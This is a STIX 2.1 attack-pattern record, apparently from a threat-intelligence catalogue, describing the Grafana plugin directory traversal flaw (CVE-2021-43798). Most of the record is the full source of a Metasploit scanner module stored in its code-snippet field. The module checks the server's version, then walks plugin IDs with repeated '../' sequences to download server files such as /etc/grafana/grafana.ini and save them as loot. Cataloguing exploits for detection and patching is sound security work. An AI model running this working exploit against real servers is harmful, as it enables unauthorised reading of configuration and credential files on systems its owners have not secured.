{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8db13cbe-5a65-4796-98ed-77d75ee02485",
    "created": "2024-08-14T16:28:26.442183Z",
    "modified": "2024-08-14T16:28:26.442188Z",
    "name": "Grafana Plugin Path Traversal",
    "description": " Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/grafana_plugin_traversal.rb",
            "external_id": "grafana_plugin_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-43798"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p"
        },
        {
            "source_name": "reference",
            "url": "https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/jas502n/Grafana-CVE-2021-43798"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce"
        },
        {
            "source_name": "reference",
            "url": "https://labs.detectify.com/security-guidance/how-i-found-the-grafana-zero-day-path-traversal-exploit-that-gave-me-access-to-your-logs/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Grafana Plugin Path Traversal',\n        'Description' => %q{\n          Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal\n          through the plugin URL.  A valid plugin ID is required, but many are installed by default.\n        },\n        'Author' => [\n          'h00die', # msf module\n          'jordyv' # discovery\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2021-12-02',\n        'References' => [\n          ['CVE', '2021-43798'],\n          ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],\n          ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],\n          ['EDB', '50581'],\n          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798'],\n          ['URL', 'https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce'],\n          ['URL', 'https://labs.detectify.com/security-guidance/how-i-found-the-grafana-zero-day-path-traversal-exploit-that-gave-me-access-to-your-logs/']\n        ]\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(3000),\n        OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),\n        OptInt.new('DEPTH', [true, 'Traversal depth', 13]),\n        OptPath.new('PLUGINS_FILE', [\n          true, 'File containing plugins to enumerate',\n          File.join(Msf::Config.data_directory, 'wordlists', 'grafana_plugins.txt')\n        ]),\n      ]\n    )\n  end\n\n  def print_progress(host, current, total)\n    print_status(\"#{host} - Progress #{current.to_s.rjust(Math.log10(total).ceil + 1)}/#{total} (#{((current.to_f / total) * 100).truncate(2)}%)\")\n  end\n\n  def check\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path)\n    })\n    return Exploit::CheckCode::Unknown unless res && res.code == 200\n\n    # We need to take into account beta versions, which end with -beta<digit>. See: https://grafana.com/docs/grafana/latest/release-notes/\n    # Also take into account preview versions, which end with -preview. See https://grafana.com/grafana/download/10.0.0-preview?edition=oss for more info.\n    /\"subTitle\":\"Grafana v(?<full_version>\\d{1,2}\\.\\d{1,2}\\.\\d{1,2}(?:(?:-beta\\d)?|(?:-preview)?)) \\([0-9a-f]{10}\\)\",/ =~ res.body\n    return Exploit::CheckCode::Safe unless full_version\n\n    # However, since 8.3.1 does not have a beta, we can safely ignore the -beta suffix when comparing versions\n    # In fact, this is necessary because Rex::Version doesn't correctly handle versions ending with -beta when comparing\n    if /-beta\\d$/ =~ full_version\n      version = Rex::Version.new(full_version[0..-7])\n    elsif /-preview$/ =~ full_version\n      version = Rex::Version.new(full_version[0..-9])\n    else\n      version = Rex::Version.new(full_version)\n    end\n\n    if version.between?(Rex::Version.new('8.0.0-beta1'), Rex::Version.new('8.0.7')) ||\n       version.between?(Rex::Version.new('8.1.0'), Rex::Version.new('8.1.8')) ||\n       version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.7')) ||\n       version.between?(Rex::Version.new('8.3.0'), Rex::Version.new('8.3.1'))\n      print_good(\"Detected vulnerable Grafana: #{full_version}\")\n      return Exploit::CheckCode::Appears\n    end\n    print_bad(\"Detected non-vulnerable Grafana: #{full_version}\")\n    return Exploit::CheckCode::Safe\n  end\n\n  def run_host(ip)\n    check_code = check\n    return unless check_code == Exploit::CheckCode::Appears\n\n    f = File.open(datastore['PLUGINS_FILE'], 'rb')\n    total = f.readlines.count\n    f.rewind\n    f = f.readlines\n    f.each_with_index do |plugin, i|\n      plugin = plugin.strip\n      print_progress(target_host, i, total)\n      vprint_status(\"Attempting plugin: #{plugin}\")\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => normalize_uri(target_uri.path, 'public', 'plugins', plugin, '../' * datastore['DEPTH'], datastore['FILEPATH'])\n      })\n      next unless res && res.code == 200\n\n      print_good(\"#{plugin} was found and exploited successfully\")\n      vprint_good(res.body)\n      path = store_loot(\n        'grafana.loot',\n        'application/octet-stream',\n        ip,\n        res.body,\n        File.basename(datastore['FILEPATH'])\n      )\n      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n      break\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-12-02"
}